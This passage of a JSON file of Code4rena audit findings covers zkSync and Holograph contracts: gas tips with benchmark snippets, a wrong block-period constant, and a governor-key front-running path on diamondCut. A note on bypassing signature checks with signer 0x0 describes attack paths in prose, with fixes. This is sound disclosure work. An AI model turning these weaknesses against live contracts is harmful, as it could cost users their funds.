      "content": "\nShifting one to the right will calculate a division by two.\n\nhe `SHR` opcode only requires 3 gas, compared to the `DIV` opcode's consumption of 5. Additionally, shifting is used to get around Solidity's division operation's division-by-0 prohibition.\n\n**Proof of concept (*without optimizations*):**\n\n```javascript\npragma solidity 0.8.16;\n\ncontract TesterA {\nfunction testDiv(uint a) public returns (uint) { return a / 2; }\n}\n\ncontract TesterB {\nfunction testShift(uint a) public returns (uint) { return a >> 1; }\n}\n```\n\nGas saving executing: **172 per entry**\n\n    TesterA.testDiv:    21965 \n    TesterB.testShift:  21793   \n\nThe same optimization can be used to multiply by 2, using the left shift.\n\n```javascript\npragma solidity 0.8.16;\n\ncontract TesterA {\nfunction testMul(uint a) public returns (uint) { return a * 2; }\n}\n\ncontract TesterB {\nfunction testShift(uint a) public returns (uint) { return a << 1; }\n}\n```\n\nGas saving executing: **201 per entry**\n\n    TesterA.testMul:    21994\n    TesterB.testShift:  21793    \n\n**Affected source code:**\n\n`/`:\n\n*   [Merkle.sol:34](https://github.com/code-423n4/2022-10-zksync/blob/4db6c596931a291b17a4e0e2929adf810a4a0eed/ethereum/contracts/zksync/libraries/Merkle.sol#L34)\n\n### Total gas saved: **(172 &ast; 1) = 172**\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2022-10-zksync",
      "github_link": "#g-04-shift-right-or-left-instead-of-dividing-or-multiply-by-2",
      "tags": [],
      "finders": []
    },
    {
      "id": "5752",
      "title": "[G-03] Use `calldata` instead of `memory`",
      "impact": "GAS",
      "content": "\nSome methods are declared as `external` but the arguments are defined as `memory` instead of as `calldata`.\n\nBy marking the function as `external` it is possible to use `calldata` in the arguments shown below and save significant gas.\n\n**Recommended change:**\n\n```diff\n-   function decodeString(bytes memory _input) external pure returns (string memory result) {\n+   function decodeString(bytes calldata _input) external pure returns (string memory result) {\n        (result) = abi.decode(_input, (string));\n    }\n```\n\n**Affected source code:**\n\n*   [ExternalDecoder.sol:10-12](https://github.com/code-423n4/2022-10-zksync/blob/4db6c596931a291b17a4e0e2929adf810a4a0eed/zksync/contracts/ExternalDecoder.sol#L10-L12)\n*   [ExternalDecoder.sol:15-17](https://github.com/code-423n4/2022-10-zksync/blob/4db6c596931a291b17a4e0e2929adf810a4a0eed/zksync/contracts/ExternalDecoder.sol#L15-L17)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2022-10-zksync",
      "github_link": "#g-03-use-calldata-instead-of-memory",
      "tags": [],
      "finders": []
    },
    {
      "id": "5751",
      "title": "[G-02] Avoid compound assignment operator in state variables",
      "impact": "GAS",
      "content": "\nUsing compound assignment operators for state variables (like `State += X` or `State -= X` ...) it's more expensive than using operator assignment (like `State = State + X` or `State = State - X` ...).\n\n**Proof of concept (*without optimizations*):**\n\n```javascript\npragma solidity 0.8.15;\n\ncontract TesterA {\nuint private _a;\nfunction testShort() public {\n_a += 1;\n}\n}\n\ncontract TesterB {\nuint private _a;\nfunction testLong() public {\n_a = _a + 1;\n}\n}\n```\n\nGas saving executing: **13 per entry**\n\n    TesterA.testShort: 43507\n    TesterB.testLong:  43494\n\n**Affected source code:**\n\n*   [DiamondCut.sol:29](https://github.com/code-423n4/2022-10-zksync/blob/4db6c596931a291b17a4e0e2929adf810a4a0eed/ethereum/contracts/zksync/facets/DiamondCut.sol#L29)\n\n### Total gas saved: **13 &ast; 1 = 13**\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2022-10-zksync",
      "github_link": "#g-02-avoid-compound-assignment-operator-in-state-variables",
      "tags": [],
      "finders": []
    },
    {
      "id": "5750",
      "title": "[G-01] Use `require` instead of `assert`",
      "impact": "GAS",
      "content": "\nThe `assert()` and `require()` functions are a part of the error handling aspect in Solidity. Solidity makes use of state-reverting error handling exceptions. This means all changes made to the contract on that call or any sub-calls are undone if an error is thrown. It also flags an error.\n\nThey are quite similar as both check for conditions and if they are not met, would throw an error.\n\nThe big difference between the two is that the `assert()` function when false, **uses up all the remaining gas and reverts all the changes made.**\n\nMeanwhile, a `require()` function when false, also reverts back all the changes made to the contract but **does refund all the remaining gas fees we offered to pay**. This is the most common Solidity function used by developers for debugging and error handling.\n\n**Affected source code:**\n\n*   [DiamondCut.sol:16](https://github.com/code-423n4/2022-10-zksync/blob/4db6c596931a291b17a4e0e2929adf810a4a0eed/ethereum/contracts/zksync/facets/DiamondCut.sol#L16)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2022-10-zksync",
      "github_link": "#g-01-use-require-instead-of-assert",
      "tags": [],
      "finders": []
    },
    {
      "id": "5749",
      "title": "[M-02] `BLOCK_PERIOD` is incorrect",
      "impact": "MEDIUM",
      "content": "\n[Config.sol#L47](https://github.com/code-423n4/2022-10-zksync/blob/456078b53a6d09636b84522ac8f3e8049e4e3af5/ethereum/contracts/zksync/Config.sol#L47)<br>\n\nThe `BLOCK_PERIOD` is set to 13 seconds in `Config.sol`.\n\n```sol\nuint256 constant BLOCK_PERIOD = 13 seconds;\n```\n\nSince moving to Proof-of-Stake (PoS) after the Merge, block times on ethereum are fixed at 12 seconds per block (slots).\n<https://ethereum.org/en/developers/docs/consensus-mechanisms/pos/#:~:text=Whereas%20under%20proof%2Dof%2Dwork,block%20proposer%20in%20every%20slot>.\n\n### Impact\n\nThis results in incorrect calculation of `PRIORITY_EXPIRATION` which is used to determine when a transaction in the Priority Queue should be considered expired.\n\n```sol\nuint256 constant PRIORITY_EXPIRATION_PERIOD = 3 days;\n/// @dev Expiration delta for priority request to be satisfied (in ETH blocks)\nuint256 constant PRIORITY_EXPIRATION = PRIORITY_EXPIRATION_PERIOD/BLOCK_PERIOD;\n```\n\nThe time difference can be calulated\n\n```python\n>>> 3*24*60*60 / 13    # 3 days / 13 sec block period\n19938.46153846154\n>>> 3*24*60*60 / 12    # 3 days / 12 sec block period\n21600.0\n>>> 21600 - 19938      # difference in blocks\n1662\n>>> 1662 * 12 / (60 * 60) # difference in hours\n5.54\n```\n\nBy using block time of 13 seconds, a transaction in the Priority Queue incorrectly expires 5.5 hours earlier than is expected.\n\n5.5 hours is a significant amount of time difference so I believe this issue to be Medium severity.\n\n### Recommended Mitigation Steps\n\nChange the block period to be 12 seconds\n\n```sol\nuint256 constant BLOCK_PERIOD = 12 seconds;\n```\n\n**[miladpiri (zkSync) confirmed and commented](https://github.com/code-423n4/2022-10-zksync-findings/issues/259#issuecomment-1324171828):**\n > This is a valid medium issue! Thanks!\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-10-zksync-findings/issues/259#issuecomment-1329983294):**\n > The warden has shown how, due to an incorrect configuration, L2Transactions will expire earlier than intended.\n> \n> The value would normally be rated a Low Severity, however, because the Warden has shown a more specific impact, I agree with Medium Severity.\n\n\n\n***\n\n",
      "summary": "\nA bug has been reported in the code of the ZKsync project on GitHub. The code has a variable called `BLOCK_PERIOD` set to 13 seconds, which is incorrect as the block time on Ethereum is fixed at 12 seconds per block. This results in incorrect calculation of `PRIORITY_EXPIRATION`, which is used to determine when a transaction in the Priority Queue should be considered expired. This leads to the transaction expiring 5.5 hours earlier than expected. The severity of this issue has been deemed to be Medium. The recommendation is to change the block period to 12 seconds.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2022-10-zksync",
      "github_link": "https://github.com/code-423n4/2022-10-zksync-findings/issues/259",
      "tags": [
        "Block Period"
      ],
      "finders": [
        "Soosh"
      ]
    },
    {
      "id": "5748",
      "title": "[M-01] `diamondCut` is not protected in case of governor's key leakage",
      "impact": "MEDIUM",
      "content": "\nWhen the governor proposes a diamondCut, governor must wait for `upgradeNoticePeriod` to be passed, or security council members have to approve the proposal to bypass the notice period, so that the governor can execute the proposal.\n\n       require(approvedBySecurityCouncil || upgradeNoticePeriodPassed, \"a6\"); // notice period should expire\n       require(approvedBySecurityCouncil || !diamondStorage.isFrozen, \"f3\");\n\nIf the governor's key is leaked and noticed by zkSync, the attacker must wait for the notice period to execute the already proposed diamondCut with the malicious `_calldata` based on the note below from zkSync, or to propose a new malicious diamondCut. For, both cases, the attacker loses time.\n\n> NOTE: proposeDiamondCut - commits data associated with an upgrade but does not execute it. While the upgrade is associated with facetCuts and (address \\_initAddress, bytes \\_calldata) the upgrade will be committed to the facetCuts and \\_initAddress. This is done on purpose, to leave some freedom to the governor to change calldata for the upgrade between proposing and executing it.\n\nSince, there is a notice period (as zkSync noticed the key leakage, security council member will not approve the proposal, so bypassing the notice period is not possible), there is enough time for zkSync to apply security measures (pausing any deposit/withdraw, reporting in media to not execute any transaction in zkSync, and so on).\n\nBut, the attacker can be smarter, just before the proposal be executed by the governor (i.e. the notice period is passed or security council members approved it), the attacker executes the proposal earlier than governor with the malicious `_calldata`. In other words, the attacker front runs the governor.\n\nTherefore, if zkSync notices the governor's key leakage beforehand, there is enough time to protect the project. But, if zkSync does not notice the governor's key leakage, the attacker can change the `_calldata` into a malicious one in the last moment so that it is not possible to protect the project.\n\n### Proof of Concept\n\n[Diamond.sol#L277](https://github.com/code-423n4/2022-10-zksync/blob/4db6c596931a291b17a4e0e2929adf810a4a0eed/ethereum/contracts/zksync/libraries/Diamond.sol#L277)<br>\n[DiamondCut.sol#L46](https://github.com/code-423n4/2022-10-zksync/blob/4db6c596931a291b17a4e0e2929adf810a4a0eed/ethereum/contracts/zksync/facets/DiamondCut.sol#L46)\n\n### Recommended Mitigation Steps\n\n`_calldata` should be included in the proposed diamondCut:[DiamondCut.sol#L27](https://github.com/code-423n4/2022-10-zksync/blob/4db6c596931a291b17a4e0e2929adf810a4a0eed/ethereum/contracts/zksync/facets/DiamondCut.sol#L27).\n\nOr, at least one of the security council members should approve the `_calldata` during execution of the proposal.\n\n**[miladpiri (zkSync) confirmed and commented](https://github.com/code-423n4/2022-10-zksync-findings/issues/46#issuecomment-1324267775):**\n > It is a valid issue, and the fix is going to be implemented, so we confirm the issue as medium! Thanks.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-10-zksync-findings/issues/46#issuecomment-1335849634):**\n > In contrast to other reports, this shows how a malicious proposal could be injected, bypassing the timelock protection, for this reason (after consulting with a second Judge), I agree with marking it as a distinct finding and agree with Medium Severity.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the zkSync project. It is related to the governor's key being leaked, and the possibility of an attacker using this key to propose malicious diamondCuts. The attacker could then potentially front-run the governor and execute the malicious diamondCut earlier than the governor can.\n\nThe code that is affected by this vulnerability is in the DiamondCut.sol and Diamond.sol files. The vulnerable code is found at lines 46 and 277 of these files.\n\nThe impact of this vulnerability is that if the governor's key is leaked and noticed by zkSync, the attacker must wait for the notice period to execute the already proposed diamondCut with the malicious `_calldata`. However, the attacker could be smarter and execute the proposal earlier than the governor with the malicious `_calldata`. This would mean that zkSync would not have enough time to protect the project.\n\nThe proof of concept for this vulnerability is also included in the report. It is found at lines 27 and 46 of the DiamondCut.sol and Diamond.sol files.\n\nThe recommended mitigation steps for this vulnerability are that the `_calldata` should be included in the proposed diamondCut, or at least one of the security council members should approve the `_calldata` during execution of the proposal.\n\nOverall, this bug report is about a vulnerability in the zkSync project related to the governor's key being leaked and the possibility of an attacker using this key to propose malicious diamondCuts. The code that is affected by this vulnerability is in the DiamondCut.sol and Diamond.sol files, and the recommended mitigation steps are that the `_calldata` should be included in the proposed diamondCut, or at least one of the security council members should approve the `_calldata` during execution of the proposal.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2022-10-zksync",
      "github_link": "https://github.com/code-423n4/2022-10-zksync-findings/issues/46",
      "tags": [
        "Admin"
      ],
      "finders": [
        "HE1M",
        "codehacker"
      ]
    },
    {
      "id": "22902",
      "title": "[23] Commented code",
      "impact": "LOW",
      "content": "\n### Proof Of Concept\n\n```\n  //   function sourceMintBatch(address to, uint224[] calldata tokenIds) external onlySource {\n  //     require(tokenIds.length < 1000, \"ERC721: max batch size is 1000\");\n  //     uint32 chain = _chain();\n  //     uint256 token;\n  //     for (uint256 i = 0; i < tokenIds.length; i++) {\n  //       require(!_burnedTokens[token], \"ERC721: can't mint burned token\");\n  //       token = uint256(bytes32(abi.encodePacked(chain, tokenIds[i])));\n  //       require(!_burnedTokens[token], \"ERC721: can't mint burned token\");\n  //       _mint(to, token);\n  //     }\n  //   }\n\n  /**\n   * @dev Allows for source smart contract to mint a batch of tokens.\n   */\n  //   function sourceMintBatch(address[] calldata wallets, uint224[] calldata tokenIds) external onlySource {\n  //     require(wallets.length == tokenIds.length, \"ERC721: array length missmatch\");\n  //     require(tokenIds.length < 1000, \"ERC721: max batch size is 1000\");\n  //     uint32 chain = _chain();\n  //     uint256 token;\n  //     for (uint256 i = 0; i < tokenIds.length; i++) {\n  //       token = uint256(bytes32(abi.encodePacked(chain, tokenIds[i])));\n  //       require(!_burnedTokens[token], \"ERC721: can't mint burned token\");\n  //       _mint(wallets[i], token);\n  //     }\n  //   }\n\n  /**\n   * @dev Allows for source smart contract to mint a batch of tokens.\n   */\n  //   function sourceMintBatchIncremental(\n  //     address to,\n  //     uint224 startingTokenId,\n  //     uint256 length\n  //   ) external onlySource {\n  //     uint32 chain = _chain();\n  //     uint256 token;\n  //     for (uint256 i = 0; i < length; i++) {\n  //       token = uint256(bytes32(abi.encodePacked(chain, startingTokenId)));\n  //       require(!_burnedTokens[token], \"ERC721: can't mint burned token\");\n  //       _mint(to, token);\n  //       startingTokenId++;\n  //     }\n  //   }\n```\nhttps://github.com/code-423n4/2022-10-holograph/blob/main/contracts/enforcer/HolographERC721.sol#L527-L570\n\n**[alexanderattar (Holograph) confirmed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/68#issuecomment-1309431800):**\n > Well done!\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22901",
      "title": "[22] Use of `ecrecover` is susceptible to signature malleability",
      "impact": "LOW",
      "content": "\nThe built-in EVM precompile `ecrecover` is susceptible to signature malleability, which could lead to replay attacks.<br>\nReferences:  https://swcregistry.io/docs/SWC-117,  https://swcregistry.io/docs/SWC-121, and  https://medium.com/cryptronics/signature-replay-vulnerabilities-in-smart-contracts-3b6f7596df57.<br>\nWhile this is not immediately exploitable, this may become a vulnerability if used elsewhere.\n\n### Recommended Mitigation Steps\nConsider using OpenZeppelin’s ECDSA library (which prevents this malleability) instead of the built-in function.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22900",
      "title": "[21] Use `bytes.concat()`",
      "impact": "LOW",
      "content": "\nSolidity version 0.8.4 introduces `bytes.concat()` (vs `abi.encodePacked(<bytes>,<bytes>)`)\n\n### Recommended Mitigation Steps\n\nUse `bytes.concat()` and upgrade to at least Solidity version 0.8.4 if required. \n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22899",
      "title": "[20] Lines are too long",
      "impact": "LOW",
      "content": "\nUsually lines in source code are limited to 80 characters. Today's screens are much larger so it's reasonable to stretch this in some cases. Since the files will most likely reside in GitHub, and GitHub starts using a scroll bar in all cases when the length is over 164 characters, the lines below should be split when they reach that length\nReference: https://docs.soliditylang.org/en/v0.8.10/style-guide.html#maximum-line-length\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22898",
      "title": "[19] Non-usage of specific imports",
      "impact": "LOW",
      "content": "\nThe current form of relative path import is not recommended for use because it can unpredictably pollute the namespace.<br>\nInstead, the Solidity docs recommend specifying imported symbols explicitly.<br>\nhttps://docs.soliditylang.org/en/v0.8.15/layout-of-source-files.html#importing-other-source-files\n\n### Recommended Mitigation Steps\n\nUse specific imports syntax per solidity docs recommendation.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22897",
      "title": "[18] Use of Block.Timestamp",
      "impact": "LOW",
      "content": "\nBlock timestamps have historically been used for a variety of applications, such as entropy for random numbers (see the Entropy Illusion for further details), locking funds for periods of time, and various state-changing conditional statements that are time-dependent. Miners have the ability to adjust timestamps slightly, which can prove to be dangerous if block timestamps are used incorrectly in smart contracts.\nReferences: SWC ID: 116\n\n### Recommended Mitigation Steps\nBlock timestamps should not be used for entropy or generating random numbers—i.e., they should not be the deciding factor (either directly or through some derivation) for winning a game or changing an important state.\n\nTime-sensitive logic is sometimes required; e.g., for unlocking contracts (time-locking), completing an ICO after a few weeks, or enforcing expiry dates. It is sometimes recommended to use block.number and an average block time to estimate times; with a 10 second block time, 1 week equates to approximately, 60480 blocks. Thus, specifying a block number at which to change a contract state can be more secure, as miners are unable to easily manipulate the block number.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22896",
      "title": "[17]] Large multiples of ten should use scientific notation",
      "impact": "LOW",
      "content": "\nUse (e.g. 1e6) rather than decimal literals (e.g. 100000), for better code readability.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22895",
      "title": "[16] Implementation contract may not be initialized",
      "impact": "LOW",
      "content": "\nOpenZeppelin recommends that the initializer modifier be applied to constructors.<br> \nPer OZs Post implementation contract should be initialized to avoid potential griefs or exploits.<br>\nhttps://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/5\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22894",
      "title": "[15] `require()` / `revert()` Statements Should Have Descriptive Reason Strings",
      "impact": "LOW",
      "content": "\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22893",
      "title": "[14] Missing event for critical parameter change",
      "impact": "LOW",
      "content": "\nWhen changing state variables events are not emitted. Emitting events allows monitoring activities with off-chain monitoring tools.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22892",
      "title": "[13] Constants Should Be Defined Rather Than Using Magic Numbers",
      "impact": "LOW",
      "content": "\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22891",
      "title": "[12] Public Functions Not Called By The Contract Should Be Declared External Instead",
      "impact": "LOW",
      "content": "\nContracts are allowed to override their parents’ functions and change the visibility from external to public.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22890",
      "title": "[11] Event Is Missing Indexed Fields",
      "impact": "LOW",
      "content": "\nIndex event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). \n\nEach event should use three indexed fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22889",
      "title": "[10] `HolographFactory.deployHolographableContract()` can overpopulate `HolographRegistry._holographableContracts`",
      "impact": "LOW",
      "content": "\nThe `require` checks in `HolographFactory.deployHolographableContract()` can easily by bypassed by sending an invalid signature and `signer` = 0x0.\n\nAs a result, this will deploy a holographableContract and update the `HolographRegistry` and push an additional item to `HolographRegistry._holographableContracts`.\n\nDue to `_holographableContracts.push(contractAddress);` in `HolographRegistryInterface(registry).setHolographedHashAddress(hash, holographerAddress);`\n\nA malicious user can overpopulate the `_holographableContracts` array with redundant data, increasing gas costs when `_holographableContracts` is iterated through.\n\n### Recommended Mitigation Steps\n\nImplement valid access control on the `HolographFactory.deployHolographableContract()` to ensure only the relevant can deploy\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22888",
      "title": "[09] `ecrecover` may return empty address",
      "impact": "LOW",
      "content": "\nThere is a common issue that ecrecover returns empty (0x0) address when the signature is invalid. function `_verifySigner` should check that before returning the result of ecrecover.\n\n### Recommended Mitigation Steps\n\nSee the solution here: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0/contracts/cryptography/ECDSA.sol#L68\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22887",
      "title": "[08] Usage of `payable.transfer` can lead to loss of funds",
      "impact": "LOW",
      "content": "\nThe funds that are to be sent can be lost. The issues with `transfer()` are outlined here:<br>\nhttps://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/\n\n### Recommended Mitigation Steps\n\nUsing low-level `call.value(amount)` with the corresponding result check or using the OpenZeppelin `Address.sendValue` is advised:<br>\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol#L60\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22886",
      "title": "[07] Low Level Calls With Solidity Version 0.8.14 Can Result In Optimiser Bug",
      "impact": "LOW",
      "content": "\nThe project contracts in scope are using low level calls with solidity version before 0.8.14 which can result in optimizer bug.<br>\nhttps://medium.com/certora/overly-optimistic-optimizer-certora-bug-disclosure-2101e3f7994d\n\nSimliar findings in Code4rena contests for reference:<br>\nhttps://code4rena.com/reports/2022-06-illuminate/#5-low-level-calls-with-solidity-version-0814-can-result-in-optimiser-bug\n\n### Recommended Mitigation Steps\n\nConsider upgrading to at least solidity v0.8.15.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22885",
      "title": "[06] Critical Changes Should Use Two-step Procedure",
      "impact": "LOW",
      "content": "\nThe critical procedures should be two step process.\n\nSee similar findings in previous Code4rena contests for reference:<br>\nhttps://code4rena.com/reports/2022-06-illuminate/#2-critical-changes-should-use-two-step-procedure\n\n### Recommended Mitigation Steps\n\nLack of two-step procedure for critical operations leaves them error-prone. Consider adding two step procedure on the critical functions.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22884",
      "title": "[05] Missing Contract-existence Checks Before Low-level Calls",
      "impact": "LOW",
      "content": "\nLow-level calls return success if there is no code present at the specified address. \n\n### Recommended Mitigation Steps\n\nIn addition to the zero-address checks, add a check to verify that `<address>.code.length > 0`\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22883",
      "title": "[04] Use `_safeMint` instead of `_mint`",
      "impact": "LOW",
      "content": "\nAccording to openzepplin's ERC721, the use of `_mint` is discouraged, use _safeMint whenever possible.<br>\nhttps://docs.openzeppelin.com/contracts/3.x/api/token/erc721#ERC721-_mint-address-uint256-\n\n### Recommended Mitigation Steps\n\nUse `_safeMint` whenever possible instead of `_mint`\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22882",
      "title": "[03] Unused `receive()` Function Will Lock Ether In Contract",
      "impact": "LOW",
      "content": "\nIf the intention is for the Ether to be used, the function should call another function, otherwise it should revert\n\n### Recommended Mitigation Steps\n\nThe function should call another function, otherwise it should revert\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22881",
      "title": "[02] Use `safetransfer` Instead Of `transfer`",
      "impact": "LOW",
      "content": "\nIt is good to add a `require()` statement that checks the return value of token transfers or to use something like OpenZeppelin’s `safeTransfer`/`safeTransferFrom` unless one is sure the given token reverts in case of a failure. Failure to do so will cause silent failures of transfers and affect token accounting in contract.\n\nFor example, Some tokens do not implement the ERC20 standard properly but are still accepted by most code that accepts ERC20 tokens. For example Tether (USDT)'s transfer() and transferFrom() functions do not return booleans as the specification requires, and instead have no return value. When these sorts of tokens are cast to IERC20, their function signatures do not match and therefore the calls made, revert.\n\n### Recommended Mitigation Steps\n\nConsider using `safeTransfer`/`safeTransferFrom` or `require()` consistently.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "22880",
      "title": "[01] Missing Checks for Address(0x0)",
      "impact": "LOW",
      "content": "\nLack of zero-address validation on address parameters may lead to transaction reverts, waste gas, require resubmission of transactions and may even force contract redeployments in certain cases within the protocol.\n\n### Recommended Mitigation Steps\n\nConsider adding explicit zero-address validation on input parameters of address type.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "5636",
      "title": "[G-25] internal functions not called by the contract should be removed to save deployment gas",
      "impact": "GAS",
      "content": "\nIf the functions are required by an interface, the contract should inherit from that interface and use the override keyword\n\n```\n2022-10-holograph/contracts/abstract/ERC20H.sol::203 => function _setOwner(address ownerAddress) internal {\n2022-10-holograph/contracts/abstract/ERC721H.sol::203 => function _setOwner(address ownerAddress) internal {\n2022-10-holograph/contracts/module/LayerZeroModule.sol::225 => * @dev Need to add an extra function to get LZ gas amount needed for their internal cross-chain message verification\n```\n\n**[alexanderattar (Holograph) confirmed](https://github.com/code-423n4/2022-10-holograph-findings/issues/313#event-7777371550)**\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
